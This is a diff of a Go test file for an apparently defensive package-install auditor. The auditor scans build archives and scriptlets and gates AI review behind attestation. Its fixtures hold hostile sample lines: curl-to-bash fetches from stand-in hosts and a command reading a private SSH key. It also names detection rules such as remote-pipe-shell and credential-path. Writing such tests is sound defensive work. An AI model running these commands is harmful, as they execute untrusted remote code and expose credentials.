@@ -7,37 +7,19 @@ import (
 	"context"
 	"errors"
 	"fmt"
-	"io"
+	"github.com/holgerjh/prolewatch/internal/brief"
+	"github.com/holgerjh/prolewatch/internal/safe"
+	"github.com/holgerjh/prolewatch/internal/ui"
 	"io/fs"
-	"net"
 	"os"
 	"path/filepath"
 	"strings"
-	"syscall"
 	"testing"
 	"time"
 
 	"github.com/klauspost/compress/zstd"
 	"golang.org/x/sys/unix"
 )
-
-func tarBytes(t *testing.T, members map[string][]byte) []byte {
-	t.Helper()
-	var raw bytes.Buffer
-	writer := tar.NewWriter(&raw)
-	for name, body := range members {
-		if err := writer.WriteHeader(&tar.Header{Name: name, Mode: 0o644, Size: int64(len(body))}); err != nil {
-			t.Fatal(err)
-		}
-		if _, err := writer.Write(body); err != nil {
-			t.Fatal(err)
-		}
-	}
-	if err := writer.Close(); err != nil {
-		t.Fatal(err)
-	}
-	return raw.Bytes()
-}
 
 func TestNULInstallScriptletBeyondBinaryPrefixCannotBeAllowed(t *testing.T) {
 	withStateAndShare(t)
@@ -76,7 +58,7 @@ func TestBlockedArtifactIsQuarantinedBeforeHandoff(t *testing.T) {
 		t.Fatal(err)
 	}
 	post := &Report{ReportID: "20260812T010203Z-aaaaaaaaaaaa-bbbbbbbb", PackageBase: "evil"}
-	if status := auditAndSeal(context.Background(), []string{packagePath}, post, service); status != 10 {
+	if status := auditAndBind(context.Background(), []string{packagePath}, post, service); status != 10 {
 		t.Fatalf("blocked artifact status=%d", status)
 	}
 	if regularNoFollow(packagePath) {
@@ -98,7 +80,7 @@ func TestSourcedExtensionlessHelperWithNULIsMandatory(t *testing.T) {
 	if err := os.WriteFile(filepath.Join(root, "helper"), []byte("echo ok\x00\necho hidden\n"), 0o600); err != nil {
 		t.Fatal(err)
 	}
-	inv, err := NewScanner(DefaultConfig()).ScanDirectory(root, "pre")
+	inv, err := brief.NewScanner(BriefConfig(DefaultConfig())).ScanDirectory(root, "pre")
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -113,7 +95,7 @@ func TestPrivilegedIntegrationMembersAreAlwaysSelected(t *testing.T) {
 		"usr/lib/udev/rules.d/99-demo.rules": []byte("ACTION==\"add\", TAG+=\"systemd\"\n"),
 		"usr/share/libalpm/hooks/demo.hook":  []byte("[Trigger]\nOperation=Install\n"),
 	})
-	result := ScanArchive(bytes.NewReader(raw), "demo.pkg.tar", DefaultConfig(), RuleEngine{}, 0)
+	result := brief.ScanArchive(bytes.NewReader(raw), "demo.pkg.tar", BriefConfig(DefaultConfig()), brief.RuleEngine{}, 0)
 	selected := map[string]bool{}
 	for _, content := range result.Selected {
 		selected[content.Path] = true
@@ -145,7 +127,7 @@ func TestArchiveLinksDevicesOwnershipAndModesFailClosed(t *testing.T) {
 	if err := writer.Close(); err != nil {
 		t.Fatal(err)
 	}
-	result := ScanArchive(bytes.NewReader(raw.Bytes()), "hostile.pkg.tar", DefaultConfig(), RuleEngine{}, 0)
+	result := brief.ScanArchive(bytes.NewReader(raw.Bytes()), "hostile.pkg.tar", BriefConfig(DefaultConfig()), brief.RuleEngine{}, 0)
 	ids := findingIDs(result.Findings)
 	if !ids["archive-escape"] || !ids["archive-owner"] || !ids["artifact-setid"] {
 		t.Fatalf("archive structural metadata was not rejected: %#v", result.Findings)
@@ -161,14 +143,14 @@ func TestSourceArchiveOwnershipDoesNotImplyInstalledOwnership(t *testing.T) {
 	}
 	_, _ = writer.Write(body)
 	_ = writer.Close()
-	result := ScanArchive(bytes.NewReader(raw.Bytes()), "vendor-source.tar", DefaultConfig(), RuleEngine{}, 0)
+	result := brief.ScanArchive(bytes.NewReader(raw.Bytes()), "vendor-source.tar", BriefConfig(DefaultConfig()), brief.RuleEngine{}, 0)
 	if findingIDs(result.Findings)["archive-owner"] {
 		t.Fatalf("source archive ownership was treated as installed ownership: %#v", result.Findings)
 	}
 }
 
 func TestBinaryStringFindingsRequireHardBlockEvidence(t *testing.T) {
-	findings := binaryStringFindings([]Finding{
+	findings := brief.BinaryStringFindings([]brief.Finding{
 		{RuleID: "unexpected-network-client", Severity: "medium", Evidence: "Nc"},
 		{RuleID: "remote-pipe-shell", Severity: "critical", HardBlock: true},
 	})
@@ -179,15 +161,15 @@ func TestBinaryStringFindingsRequireHardBlockEvidence(t *testing.T) {
 
 func TestExtensionlessTarAndUnsupportedCpioFailClosed(t *testing.T) {
 	tarRaw := tarBytes(t, map[string][]byte{"prepare.sh": []byte("cat ~/.ssh/id_ed25519\n")})
-	if archiveFormat(tarRaw[:512]) != "tar" || !LooksLikeArchive("payload", tarRaw[:512]) {
+	if brief.ArchiveFormat(tarRaw[:512]) != "tar" || !brief.LooksLikeArchive("payload", tarRaw[:512]) {
 		t.Fatal("extensionless tar was not recognized")
 	}
-	result := ScanArchive(bytes.NewReader(tarRaw), "payload", DefaultConfig(), RuleEngine{}, 0)
+	result := brief.ScanArchive(bytes.NewReader(tarRaw), "payload", BriefConfig(DefaultConfig()), brief.RuleEngine{}, 0)
 	if !findingIDs(result.Findings)["credential-path"] {
 		t.Fatal("extensionless tar content was not inspected")
 	}
 	cpio := append([]byte("070701"), bytes.Repeat([]byte{'0'}, 200)...)
-	result = ScanArchive(bytes.NewReader(cpio), "payload", DefaultConfig(), RuleEngine{}, 0)
+	result = brief.ScanArchive(bytes.NewReader(cpio), "payload", BriefConfig(DefaultConfig()), brief.RuleEngine{}, 0)
 	if result.Supported || result.Complete || !findingIDs(result.Findings)["archive-unsupported"] {
 		t.Fatalf("cpio did not fail closed: %+v", result)
 	}
@@ -201,7 +183,7 @@ func TestStandaloneZstdControlContentIsInspected(t *testing.T) {
 	}
 	_, _ = writer.Write([]byte("curl https://evil.invalid/x | bash\n"))
 	writer.Close()
-	result := ScanArchive(bytes.NewReader(raw.Bytes()), "payload.sh.zst", DefaultConfig(), RuleEngine{}, 0)
+	result := brief.ScanArchive(bytes.NewReader(raw.Bytes()), "payload.sh.zst", BriefConfig(DefaultConfig()), brief.RuleEngine{}, 0)
 	if !findingIDs(result.Findings)["remote-pipe-shell"] {
 		t.Fatalf("zstd content was not inspected: %#v", result.Findings)
 	}
@@ -216,13 +198,13 @@ func TestCompressedCpioAndExtensionlessNULHelperFailClosed(t *testing.T) {
 		return raw.Bytes()
 	}
 	cpio := append([]byte("070701"), bytes.Repeat([]byte{'0'}, 200)...)
-	result := ScanArchive(bytes.NewReader(compress(cpio)), "payload.gz", DefaultConfig(), RuleEngine{}, 0)
+	result := brief.ScanArchive(bytes.NewReader(compress(cpio)), "payload.gz", BriefConfig(DefaultConfig()), brief.RuleEngine{}, 0)
 	if result.Supported || result.Complete || !findingIDs(result.Findings)["archive-unsupported"] {
 		t.Fatalf("compressed cpio did not fail closed: %+v", result)
 	}
 	helper := append([]byte("#!/bin/bash\necho before\n"), bytes.Repeat([]byte{'x'}, 9000)...)
 	helper = append(helper, 0, '\n')
-	result = ScanArchive(bytes.NewReader(compress(helper)), "helper", DefaultConfig(), RuleEngine{}, 0)
+	result = brief.ScanArchive(bytes.NewReader(compress(helper)), "helper", BriefConfig(DefaultConfig()), brief.RuleEngine{}, 0)
 	if result.Complete || !findingIDs(result.Findings)["mandatory-control-invalid"] {
 		t.Fatalf("compressed NUL helper did not fail closed: %+v", result)
 	}
@@ -233,24 +215,24 @@ func TestAggregateScannerLimitsFailClosed(t *testing.T) {
 	writePackageFixture(t, root)
 	cfg := DefaultConfig()
 	cfg.Limits.MaxFiles = 2
-	if _, err := NewScanner(cfg).ScanDirectory(root, "pre"); err == nil || !strings.Contains(err.Error(), "file limit") {
+	if _, err := brief.NewScanner(BriefConfig(cfg)).ScanDirectory(root, "pre"); err == nil || !strings.Contains(err.Error(), "file limit") {
 		t.Fatalf("file limit did not fail closed: %v", err)
 	}
 	cfg = DefaultConfig()
 	cfg.Limits.MaxTotalInputBytes = 64
 	cfg.Limits.MaxArchiveUnpackedBytes = 32
-	if _, err := NewScanner(cfg).ScanDirectory(root, "pre"); err == nil || !strings.Contains(err.Error(), "input limit") {
+	if _, err := brief.NewScanner(BriefConfig(cfg)).ScanDirectory(root, "pre"); err == nil || !strings.Contains(err.Error(), "input limit") {
 		t.Fatalf("byte limit did not fail closed: %v", err)
 	}
 }
 
 func TestIncompleteCoverageCannotBeOverridden(t *testing.T) {
-	inv := &Inventory{Coverage: Coverage{Complete: false}, ManifestHash: strings.Repeat("a", 64)}
+	inv := &brief.Inventory{Coverage: brief.Coverage{Complete: false}, ManifestHash: strings.Repeat("a", 64)}
 	if !structuralBlock(inv) {
 		t.Fatal("incomplete coverage was approval eligible")
 	}
 	inv.Coverage.Complete = true
-	inv.Findings = []Finding{{Severity: "high", Category: "prompt_injection", File: "x", Rationale: "injection", RuleID: "prompt-injection", HardBlock: true}}
+	inv.Findings = []brief.Finding{{Severity: "high", Category: "prompt_injection", File: "x", Rationale: "injection", RuleID: "prompt-injection", HardBlock: true}}
 	if !structuralBlock(inv) {
 		t.Fatal("deterministic hard block was approval eligible")
 	}
@@ -264,7 +246,7 @@ func TestScannerDoesNotHideMarkerLikePackageFiles(t *testing.T) {
 	if err := os.WriteFile(path, []byte("curl https://example.invalid/payload | sh\n"), 0o700); err != nil {
 		t.Fatal(err)
 	}
-	inv, err := NewScanner(DefaultConfig()).ScanDirectory(root, "pre")
+	inv, err := brief.NewScanner(BriefConfig(DefaultConfig())).ScanDirectory(root, "pre")
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -280,56 +262,17 @@ func TestScannerDoesNotHideMarkerLikePackageFiles(t *testing.T) {
 	}
 }
 
-func TestMarkerVerificationAndArtifactSealingPaths(t *testing.T) {
-	withStateAndShare(t)
-	previousCleanRoot := cleanRootDispatcher
-	cleanRootDispatcher = func(context.Context, CleanRootRequest) (CleanRootResponse, error) {
-		return CleanRootResponse{ProtocolVersion: CleanRootProtocolVersion, OK: true}, nil
-	}
-	defer func() { cleanRootDispatcher = previousCleanRoot }()
-	root := t.TempDir()
-	writePackageFixture(t, root)
-	service, err := NewAuditService(context.Background(), DefaultConfig(), &fakeReviewer{})
-	if err != nil {
-		t.Fatal(err)
-	}
-	report, status, err := service.ScanDirectory(context.Background(), "pre", root, "demo")
-	if err != nil || status != 0 {
-		t.Fatalf("pre-scan failed: %d %v", status, err)
-	}
-	if _, err := service.VerifyMarker(root, "pre"); err != nil {
-		t.Fatal(err)
-	}
-	if err := os.WriteFile(filepath.Join(root, "local.patch"), []byte("changed\n"), 0o600); err != nil {
-		t.Fatal(err)
-	}
-	if _, err := service.VerifyMarker(root, "pre"); err == nil {
-		t.Fatal("changed content retained marker authority")
-	}
-	packagePath := filepath.Join(t.TempDir(), "demo.pkg.tar")
-	if err := os.WriteFile(packagePath, tarBytes(t, map[string][]byte{"usr/share/demo/data": []byte("safe\n")}), 0o600); err != nil {
-		t.Fatal(err)
-	}
-	if status := auditAndSeal(context.Background(), []string{packagePath}, report, service); status != 0 {
-		t.Fatalf("safe artifact did not seal: %d", status)
-	}
-	sealed, _ := sealedPath(report, filepath.Base(packagePath))
-	if !regularNoFollow(sealed) || regularNoFollow(packagePath) {
-		t.Fatalf("artifact handoff was not a move to sealed storage: %s", sealed)
-	}
-}
-
 func TestMoveVerifiedAndHashBinding(t *testing.T) {
 	dir := t.TempDir()
 	source, destination := filepath.Join(dir, "source"), filepath.Join(dir, "destination")
-	if err := os.WriteFile(source, []byte("sealed bytes"), 0o600); err != nil {
+	if err := os.WriteFile(source, []byte("reviewed bytes"), 0o600); err != nil {
 		t.Fatal(err)
 	}
-	before, _ := HashFileNoFollow(source)
+	before, _ := safe.HashFileNoFollow(source)
 	if err := moveVerified(source, destination); err != nil {
 		t.Fatal(err)
 	}
-	after, _ := HashFileNoFollow(destination)
+	after, _ := safe.HashFileNoFollow(destination)
 	if before != after || regularNoFollow(source) {
 		t.Fatal("verified move changed content or retained source")
 	}
@@ -352,71 +295,6 @@ func TestMoveVerifiedCrossFilesystemCopy(t *testing.T) {
 	}
 	if regularNoFollow(source) || !regularNoFollow(destination) {
 		t.Fatal("cross-device move did not transfer ownership")
-	}
-}
-
-func TestNetworkBrokerRejectsLocalDestinations(t *testing.T) {
-	ctx, cancel := context.WithCancel(context.Background())
-	defer cancel()
-	socket := filepath.Join(t.TempDir(), "broker.sock")
-	if listener, err := net.Listen("unix", socket); err != nil {
-		if errors.Is(err, syscall.EPERM) {
-			t.Skip("sandbox forbids Unix sockets")
-		}
-		t.Fatalf("test environment cannot create broker socket %q (%d bytes): %v", socket, len(socket), err)
-	} else {
-		listener.Close()
-		_ = os.Remove(socket)
-	}
-	done := make(chan int, 1)
-	go func() { done <- RunNetworkBroker(ctx, socket, DefaultConfig().Network) }()
-	deadline := time.Now().Add(2 * time.Second)
-	for {
-		if _, err := os.Lstat(socket); err == nil {
-			break
-		}
-		select {
-		case status := <-done:
-			t.Fatalf("broker exited before readiness: %d", status)
-		default:
-		}
-		if time.Now().After(deadline) {
-			t.Fatal("broker did not become ready")
-		}
-		time.Sleep(10 * time.Millisecond)
-	}
-	conn, err := net.Dial("unix", socket)
-	if err != nil {
-		t.Fatal(err)
-	}
-	_, _ = io.WriteString(conn, "CONNECT 127.0.0.1:443 HTTP/1.1\r\nHost: 127.0.0.1:443\r\n\r\n")
-	raw, _ := io.ReadAll(conn)
-	conn.Close()
-	if !bytes.Contains(raw, []byte("403 Forbidden")) {
-		t.Fatalf("local CONNECT was not denied: %q", raw)
-	}
-	cancel()
-	if status := <-done; status != 0 {
-		t.Fatalf("broker cancellation status=%d", status)
-	}
-}
-
-func TestNetworkAddressAndProxyPolicy(t *testing.T) {
-	broker := &networkBroker{}
-	broker.captureHostNetworks()
-	for _, value := range []string{"127.0.0.1", "10.0.0.1", "169.254.169.254", "100.64.0.1", "192.0.2.1", "2001:db8::1"} {
-		if broker.publicIP(net.ParseIP(value)) {
-			t.Errorf("non-public address allowed: %s", value)
-		}
-	}
-	if !broker.publicIP(net.ParseIP("8.8.8.8")) {
-		t.Fatal("known public address rejected")
-	}
-	if _, _, err := splitHostPortDefault("example.com:22", 80); err == nil {
-		t.Fatal("non-web port accepted")
-	}
-	if _, err := broker.dialPublic(context.Background(), "localhost", 443); err == nil {
-		t.Fatal("loopback DNS answer accepted")
 	}
 }
 
@@ -443,7 +321,7 @@ func TestWorkspaceAndOutputLimitsSignal(t *testing.T) {
 	}
 	overflow := make(chan error, 1)
 	observed := false
-	writer := &notifyingBuffer{buffer: newLimitedBuffer(4), errors: overflow, observer: func(commandOutputStream, []byte) { observed = true }}
+	writer := &notifyingBuffer{buffer: safe.NewLimitedBuffer(4), errors: overflow, observer: func(commandOutputStream, []byte) { observed = true }}
 	if _, err := writer.Write([]byte("12345")); err == nil {
 		t.Fatal("output overflow accepted")
 	}
@@ -536,16 +414,7 @@ func TestWorkspaceMonitorAcceptsOnlyMakepkgLockedPackageDirectory(t *testing.T) 
 	}
 }
 
-func TestConfigMigrationAndSystemPathValidation(t *testing.T) {
-	path := filepath.Join(t.TempDir(), "config.json")
-	legacy := `{"provider":"codex","providers":{"codex":{"model":"gpt","effort":"high"},"anthropic":{"model":"sonnet","effort":"high"}},"review":{"timeout_seconds":1,"kill_grace_seconds":1,"batch_bytes":1024},"limits":{"max_dispatch_bytes":2048,"max_archive_entries":1,"max_archive_unpacked_bytes":2048,"max_archive_depth":1,"max_text_per_file":1024,"max_selected_text_bytes":1024,"binary_strings_bytes":128}}`
-	if err := os.WriteFile(path, []byte(legacy), 0o600); err != nil {
-		t.Fatal(err)
-	}
-	cfg, err := MigrateConfig(path)
-	if err != nil || cfg.Build.MemoryBytes == 0 || cfg.Limits.MaxFiles == 0 {
-		t.Fatalf("legacy migration failed: %+v %v", cfg, err)
-	}
+func TestSystemPathValidation(t *testing.T) {
 	if _, err := openRootOwnedPath("/tmp", true); err == nil {
 		t.Fatal("world-writable system path accepted")
 	}
@@ -557,10 +426,10 @@ func TestConfigMigrationAndSystemPathValidation(t *testing.T) {
 func TestProviderAttestationBinding(t *testing.T) {
 	t.Setenv("XDG_STATE_HOME", t.TempDir())
 	metadata := ProviderMetadata{Provider: "codex", Transport: "cli", RuntimeVersion: "test", Model: "gpt", Effort: "high", AdapterPolicy: "test"}
-	provider := ToolIdentity{Path: "/usr/bin/codex", Version: "test", SHA256: strings.Repeat("a", 64)}
-	archive := ToolIdentity{Path: "/usr/bin/bsdtar", Version: "test", SHA256: strings.Repeat("b", 64)}
+	provider := brief.ToolIdentity{Path: "/usr/bin/codex", Version: "test", SHA256: strings.Repeat("a", 64)}
+	archive := brief.ToolIdentity{Path: "/usr/bin/bsdtar", Version: "test", SHA256: strings.Repeat("b", 64)}
 	fingerprint := strings.Repeat("c", 64)
-	if err := saveProviderAttestation(fingerprint, metadata, provider, archive); err != nil {
+	if err := saveProviderAttestation(fingerprint, metadata, provider, archive, CanaryChecks{EmptyWorkspace: true, NoHostRead: true, PromptInjectionRecognised: true}); err != nil {
 		t.Fatal(err)
 	}
 	if err := loadProviderAttestation(fingerprint, metadata, provider, archive); err != nil {
@@ -579,8 +448,9 @@ func TestRealAuditServiceRequiresAndAcceptsBoundAttestation(t *testing.T) {
 	reviewClientFactory = func(Config) ReviewClient { return reviewer }
 	codexHostBinary = writeExecutable(t, "echo codex")
 	cfg := DefaultConfig()
+	cfg.Review.Mode = ReviewModeAI
 	metadata, _ := reviewer.Probe(context.Background())
-	archive, err := archiveProbeIdentity(context.Background())
+	archive, err := brief.ArchiveProbeIdentity(context.Background())
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -592,10 +462,22 @@ func TestRealAuditServiceRequiresAndAcceptsBoundAttestation(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	if _, err := NewAuditService(context.Background(), cfg, nil); err == nil {
-		t.Fatal("missing provider attestation was accepted")
+	// AI review is enrichment, so a missing attestation must not block an
+	// install. It must disable the reviewer: attestation binds the provider
+	// binary's identity to this policy, so without it nothing establishes that
+	// verdicts came from the configured reviewer. Degrading must not quietly
+	// widen what an optional component is allowed to contribute.
+	degraded, err := NewAuditService(context.Background(), cfg, nil)
+	if err != nil {
+		t.Fatalf("a missing attestation blocked the service: %v", err)
 	}
-	if err := saveProviderAttestation(fingerprint, metadata, provider, archive); err != nil {
+	if degraded.Reviewer != nil {
+		t.Fatal("an unattested provider was kept as the reviewer")
+	}
+	if !strings.Contains(degraded.InitializationError, "attestation") {
+		t.Fatalf("the briefing would not say why AI review is absent: %q", degraded.InitializationError)
+	}
+	if err := saveProviderAttestation(fingerprint, metadata, provider, archive, CanaryChecks{EmptyWorkspace: true, NoHostRead: true, PromptInjectionRecognised: true}); err != nil {
 		t.Fatal(err)
 	}
 	service, err := NewAuditService(context.Background(), cfg, nil)
@@ -610,7 +492,7 @@ func TestResourceDefaultsAndDispatcherFailClosed(t *testing.T) {
 		t.Fatalf("invalid effective resource limits: %+v", effective)
 	}
 	var stdout, stderr bytes.Buffer
-	status := RunProviderDispatcher(context.Background(), strings.NewReader("{}"), &stdout, &stderr)
+	status := runProviderWorker(context.Background(), strings.NewReader("{}"), &stdout, &stderr)
 	if status == 0 || stderr.Len() == 0 {
 		t.Fatalf("invalid dispatcher invocation did not fail closed: %d", status)
 	}
@@ -640,24 +522,11 @@ func TestSandboxEnforcementSchemaRejectsInvalidRecords(t *testing.T) {
 	}
 }
 
-func TestCountedTransferLimit(t *testing.T) {
-	broker := &networkBroker{cfg: NetworkConfig{MaxTransferBytes: 3}}
-	var target bytes.Buffer
-	writer := &countedWriter{Writer: &target, broker: broker}
-	if _, err := writer.Write([]byte("four")); err == nil {
-		t.Fatal("network transfer limit accepted")
-	}
-	reader := &countedReadCloser{ReadCloser: io.NopCloser(strings.NewReader("more")), broker: &networkBroker{cfg: NetworkConfig{MaxTransferBytes: 3}}}
-	if _, err := reader.Read(make([]byte, 4)); err == nil {
-		t.Fatal("network upload limit accepted")
-	}
-}
-
 func TestArchiveAndFindingBudgetErrors(t *testing.T) {
 	cfg := DefaultConfig()
 	cfg.Limits.MaxFindings = 1
-	result := &ArchiveScan{Findings: []Finding{{}, {}}}
-	if err := checkArchiveBudget(result, cfg); err == nil {
+	result := &brief.ArchiveScan{Findings: []brief.Finding{{}, {}}}
+	if err := brief.CheckArchiveBudget(result, BriefConfig(cfg)); err == nil {
 		t.Fatal("archive finding budget accepted")
 	}
 	if !errors.Is(context.Canceled, context.Canceled) {
@@ -665,27 +534,29 @@ func TestArchiveAndFindingBudgetErrors(t *testing.T) {
 	}
 }
 
-func TestEveryAggregateScannerBudgetFailsClosed(t *testing.T) {
-	cfg := DefaultConfig()
-	scanner := NewScanner(cfg)
-	cases := []*Inventory{
-		{started: time.Now().Add(-time.Duration(cfg.Limits.ScanTimeoutSeconds+1) * time.Second)},
-		{Findings: make([]Finding, cfg.Limits.MaxFindings+1)},
-		{Coverage: Coverage{ArchivesSeen: cfg.Limits.MaxArchives + 1}},
-		{Coverage: Coverage{ArchiveEntries: cfg.Limits.MaxArchiveEntries + 1}},
-		{Coverage: Coverage{ArchiveUnpackedBytes: cfg.Limits.MaxArchiveUnpackedBytes + 1}},
+// Automatic privileged integration requires an explicit gate decision; a
+// redirected or missing terminal cannot silently keep it.
+func TestAGateThatCannotAskStopsTheInstall(t *testing.T) {
+	withStateAndShare(t)
+	packagePath := filepath.Join(t.TempDir(), "surface.pkg.tar")
+	body := []byte("post_install() { echo hello; }\n")
+	if err := os.WriteFile(packagePath, tarBytes(t, map[string][]byte{".INSTALL": body}), 0o600); err != nil {
+		t.Fatal(err)
 	}
-	for index, inventory := range cases {
-		if err := scanner.checkBudget(inventory); err == nil {
-			t.Errorf("scanner budget mutation %d accepted", index)
-		}
+	service, err := NewAuditService(context.Background(), DefaultConfig(), &fakeReviewer{})
+	if err != nil {
+		t.Fatal(err)
 	}
-	for reason, expected := range map[string]int{"mandatory": 0, "archive-member": 1, "binary-metadata": 2, "executable": 3, "other": 4} {
-		if got := selectionPriority(reason); got != expected {
-			t.Errorf("selection priority %q=%d, want %d", reason, got, expected)
-		}
+	previousPrompter, previousEnumerator := gatePrompter, gateEnumerator
+	defer func() { gatePrompter, gateEnumerator = previousPrompter, previousEnumerator }()
+	gateEnumerator = func(context.Context, string) ([]brief.PrivilegedSurface, error) {
+		return []brief.PrivilegedSurface{{Member: ".INSTALL", Kind: "scriptlet"}}, nil
 	}
-	if got := displayPath(string([]byte{'a', 0xff})); got != `a\xff` {
-		t.Fatalf("invalid path display=%q", got)
+	gatePrompter = func(string, []brief.PrivilegedSurface) (ui.GateDecision, error) {
+		return ui.GateDecision{}, ui.ErrNoGateDecision
+	}
+	post := &Report{ReportID: "20260812T010203Z-aaaaaaaaaaaa-bbbbbbbb", PackageBase: "surface"}
+	if status := auditAndBind(context.Background(), []string{packagePath}, post, service); status != 10 {
+		t.Fatalf("an unanswered gate handed the package on: status=%d", status)
 	}
 }
